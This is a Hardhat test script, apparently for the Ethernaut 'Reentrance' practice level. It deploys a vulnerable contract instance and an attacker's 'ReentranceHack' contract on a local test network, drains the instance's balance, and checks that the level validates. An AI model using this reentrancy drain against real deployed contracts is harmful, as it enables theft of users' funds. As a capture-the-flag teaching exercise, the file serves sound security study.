import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

const INSERT_COIN = ethers.utils.parseEther("0.001");

describe("Reentrance exploit", () => {
  async function deployReentranceFixture() {
    const [deployer, attacker] = await ethers.getSigners();

    // Deploy factory contract
    const ReentranceFactory = await ethers.getContractFactory("ReentranceFactory");
    const reentranceFactory = await ReentranceFactory.connect(deployer).deploy();

    // We cannot get the return value of the state-changing function off-chain.
    // Simulate on-chain execution of the createInstance() to get the return value (the address of the deployed instance).
    const reentranceAddress = await reentranceFactory
      .connect(attacker)
      .callStatic.createInstance(attacker.address, { value: INSERT_COIN });

    // Create a level instance
    const tx = await reentranceFactory.connect(attacker).createInstance(attacker.address, { value: INSERT_COIN });
    await tx.wait();

    // Get deployed instance of Reentrance contract
    const reentrance = await ethers.getContractAt("Reentrance", reentranceAddress);

    const ReentranceHack = await ethers.getContractFactory("ReentranceHack");
    const reentranceHack = await ReentranceHack.connect(attacker).deploy(reentrance.address);

    return { deployer, attacker, reentranceFactory, reentrance, reentranceHack };
  }

  it("Should steal all the funds from the contract", async () => {
    // loadFixture() will run the setup the first time, and quickly return to that state in the other tests.
    const { attacker, reentranceFactory, reentrance, reentranceHack } = await loadFixture(deployReentranceFixture);

    console.log(" Reentrance Balance Before Hack : ", await ethers.provider.getBalance(reentrance.address));

    let tx = await reentranceHack.connect(attacker).hack({ value: INSERT_COIN });
    await tx.wait();

    console.log(" Reentrance Balance After Hack : ", await ethers.provider.getBalance(reentrance.address));

    // Simulate on-chain execution of the submitInstance()
    const success = await reentranceFactory
      .connect(attacker)
      .callStatic.validateInstance(reentrance.address, attacker.address);

    expect(success).to.be.true;

    // Submit the instance
    tx = await reentranceFactory.connect(attacker).validateInstance(reentrance.address, attacker.address);
    await tx.wait();
  });
});
